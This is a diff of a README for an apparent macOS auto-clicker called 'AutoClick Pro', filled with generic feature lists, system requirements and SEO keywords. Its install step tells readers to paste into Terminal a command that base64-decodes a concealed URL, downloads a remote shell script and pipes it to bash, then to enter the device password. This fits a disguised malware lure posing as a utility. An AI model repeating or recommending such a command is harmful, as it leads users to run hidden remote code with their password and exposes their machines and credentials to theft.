@@ -1,45 +1,38 @@
-# ⚡ AutoClick Pro - Precise Automated Clicking for macOS
+# 🖱 AutoClick Pro – Smart Automated Clicks for macOS
 
-AutoClick Pro is a macOS utility designed to automate mouse clicks with high precision and minimal resource usage. It's perfect for developers, testers, and power users who need repetitive clicking automation without complex scripting. Lightweight and native to macOS, it ensures smooth performance.
+📌 About AutoClick Pro  
+AutoClick Pro automates mouse clicks with precision, ideal for repetitive tasks in workflows, testing, or gaming. Designed for macOS, it offers customizable intervals, locations, and click patterns while ensuring minimal system impact. Privacy-focused with no data collection, it runs locally for secure automation. Integrates smoothly with macOS accessibility features for seamless operation.
 
-## 🧰 Install on macOS
-Open Terminal and run:
+## 🧰 Installation via a terminal command:
+1. Copy the installation command below
 ```
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
 ```
+2. Open Terminal on your device, paste the command, then press Return  
+3. Enter your device password when prompted and confirm the installation  
 
-## 🎯 Key Features
-⚡️ **Fast Automation**: Execute clicks with millisecond precision for seamless task handling  
-🔒 **Secure & Local**: No cloud dependency; all processing happens on your machine  
-⚙️ **Customizable Intervals**: Set click delays, durations, and patterns effortlessly  
-🚀 **Low Latency**: Optimized for macOS to ensure minimal CPU usage  
-🎨 **Native UI**: Blends seamlessly with macOS design for intuitive use  
-📊 **Activity Logging**: Track click history and performance metrics  
+![Installing via Terminal](https://i.postimg.cc/NfzQxpMT/0723-1.gif)
 
-## 🛡 Why Choose
-🛠 **Reliable Support**: Backed by active development and troubleshooting guides  
-✅ **Proven Efficiency**: Trusted by QA testers and productivity enthusiasts  
-🤝 **Open Feedback**: Feature requests and bug reports are prioritized  
-🏅 **Optimized Performance**: Lightweight yet powerful for sustained use  
+## 📸 Overview  
+A quick look at key parts in action:  
+- ![](https://cdn.osxdaily.com/wp-content/uploads/2025/03/maclicker-mac-autoclicker.jpg)  
+- ![](https://www.chip.de/ii/1/2/6/3/8/7/7/8/6/bfc012027d1f52af.jpg)  
 
-## 🏆 Why Use It
-🎯 **Boost Productivity**: Automate repetitive tasks and save hours  
-💡 **Easy Setup**: Configure clicks in seconds with no learning curve  
-🔧 **System-Friendly**: Runs quietly in the background without slowdowns  
-🌐 **Standalone Tool**: No extra dependencies or bloated packages  
 
-## 💡 System Requirements
-- OS: macOS 12.0 Monterey or newer  
-- CPU: Apple M1 or Intel Core i5  
-- RAM: 4 GB minimum  
-- Storage: 200 MB available space  
-- Others: Terminal access, active internet connection  
+## 🎯 Key Features  
+⚡️ **Fast Automation**: Execute rapid or delayed clicks with adjustable timing  
+🔒 **Privacy-First**: No data collection—runs entirely locally  
+⚙️ **Customizable Patterns**: Set click sequences for complex workflows  
+🚀 **Low Latency**: Optimized for minimal CPU usage  
+🎨 **Native macOS UI**: Blends seamlessly with system aesthetics  
+📊 **Session Logs**: Review click history for debugging  
 
-## 📜 Contributing
-To contribute, fork this repository and open a pull request with a clear explanation. Follow our macOS development standards.
+## 💡 System Requirements  
+- **OS**: macOS 12.0 Monterey or newer  
+- **CPU**: Apple Silicon or Intel Core i5 and above  
+- **RAM**: 4 GB minimum  
+- **Storage**: 200 MB available  
+- **Others**: Terminal access and active internet connection  
 
-## 📄 License
-MIT License © 2024 AutoClick Tools
-
-## 🔍 SEO Keywords
-macOS auto clicker, mouse automation, click automation tool, repetitive task automation, productivity tools for Mac, auto click software, mouse clicker app, testing automation, macOS utility, open-source auto clicker, click interval tool, lightweight automation, QA testing tools, hotkey clicker, mouse macro tool
+## 🔍 SEO Keywords  
+`macOS automation` · `auto clicker` · `mouse automation` · `productivity tool` · `privacy-focused` · `click scheduler`
